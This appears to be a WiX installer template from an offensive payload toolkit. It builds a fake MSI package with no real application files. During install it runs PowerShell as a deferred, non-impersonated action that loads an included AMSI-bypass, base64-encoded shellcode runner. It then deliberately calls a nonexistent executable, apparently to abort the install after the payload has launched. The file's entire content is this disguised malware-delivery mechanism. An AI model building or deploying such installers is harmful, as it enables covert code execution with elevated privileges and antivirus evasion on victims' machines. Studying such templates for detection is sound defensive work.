content: |
  <?xml version="1.0" encoding="UTF-8"?>
  <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
    <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111"
             Name="23e23deeqwddeweqwde" Version="0.0.1" Manufacturer="Test1" Language="1033">
      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package" />
      <Media Id="1" Cabinet="product.cab" EmbedCab="yes" />

      <Directory Id="TARGETDIR" Name="SourceDir">
        <Directory Id="ProgramFilesFolder">
          <Directory Id="INSTALLLOCATION" Name="Example">
            <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
            </Component>
          </Directory>
        </Directory>
      </Directory>

      <Feature Id="DefaultFeature" Level="1">
        <ComponentRef Id="ApplicationFiles" />
      </Feature>

      <Property Id="ShellExe" Value="powershell.exe" />
      <CustomAction
        Id           ="install_step"
        Property     ="ShellExe"
        ExeCommand   ="{{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml') }}"
        Execute      ="deferred"
        Impersonate  ="no"
        Return       ="asyncNoWait"
      />

      <CustomAction
         Id          ="error_step"
         Property    ="ShellExe"
         ExeCommand  ='C:\eddgge.exe'
         Return      ="check"
         Execute     ="deferred"
         Impersonate ="no"
      />

      <InstallExecuteSequence>
        <Custom Action="install_step" After="InstallInitialize" />
        <Custom Action="error_step" Before="InstallFinalize" />
      </InstallExecuteSequence>
    </Product>
  </Wix>
